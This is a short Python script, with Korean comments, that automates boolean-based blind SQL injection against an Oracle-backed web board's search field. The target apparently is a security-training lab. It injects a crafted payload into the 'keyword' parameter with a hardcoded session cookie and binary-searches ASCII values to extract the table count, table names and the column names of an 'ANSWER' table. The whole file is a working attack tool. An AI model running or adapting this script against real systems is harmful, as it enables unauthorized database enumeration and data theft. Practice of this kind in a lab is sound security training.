import requests
urlbase = "http://elms1.skinfosec.co.kr:8082/community6/free"
jession = {"JSESSIONID" : "83CBA6304C8FC5C06789BA197B954FA8"}
contype = {"Content-Type" : "application/x-www-form-urlencoded "}
param = {"searchType":"all", "keyword":"yahoo"}

keywordbase = "yahoo%' and {} and '1%'='1"

def binarySearch(querybase):
    min = 1
    max = 127
    querybase = "(" + querybase + ") > {}"
    while min != max:
        avg = int((min + max) / 2)
        query = querybase.format(avg)
        param["keyword"] = keywordbase.format(query)
        res = requests.post(urlbase, data=param, cookies=jession, headers=contype)

        if "REIZEI" in res.text:
            min = avg +1
        else:
            max = avg
    return min

countQuery = "select count(table_name) from user_tables"
countResult = binarySearch(countQuery)

print("테이블 수 : "+ str(countResult))

for i in range(1, countResult + 1):
    lengthQuery = "select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(i)
    lengthResult = binarySearch(lengthQuery)
    #print("{}번쨰 테이블의 문자열 길이 : {}".format(i,lengthResult))
    table_name = ""
    # 지워야함 ctrl + alt + 방향키로 들여쓰기 없앰
    if lengthResult == 6 :
        for j in range(1, lengthResult+1):
            substrQuery = "select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(j,i) 
            asciiSubstr = binarySearch(substrQuery)
            table_name = table_name + chr(asciiSubstr)
        print("{}번째 테이블 명 : {}".format(i, table_name))
        if  "ANSWER" == table_name :
            columnCountQuery = "select count(column_name) from all_tab_columns where table_name = '{}'".format(table_name)
            column_count = binarySearch(columnCountQuery)
            print("{}번째 테이블인 {} 테이블의 컬럼 개수 : {}개 ".format(i,table_name,column_count))

            for m in range(1, column_count + 1):
                # 각 칼럼의 길이를 확인하는 쿼리
                column_name_query = f"select length(column_name) from all_tab_columns where table_name = '{table_name}' and column_id = {m}"
                column_name_length = binarySearch(column_name_query)
                print(f"{table_name} 테이블의 {m}번째 칼럼 길이: {column_name_length}")  
                column_name = ""
                for n in range(1, column_name_length+1):
                    #각 칼럼명 구하는 쿼리
                    substr_column_query = f"select ascii(substr(column_name, {n}, 1)) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{table_name}') where rnum = {m}"
                    ascii_column = binarySearch(substr_column_query)
                    column_name += chr(ascii_column)
                print(f"{table_name} 테이블의 {m}번째 칼럼명 : {column_name}")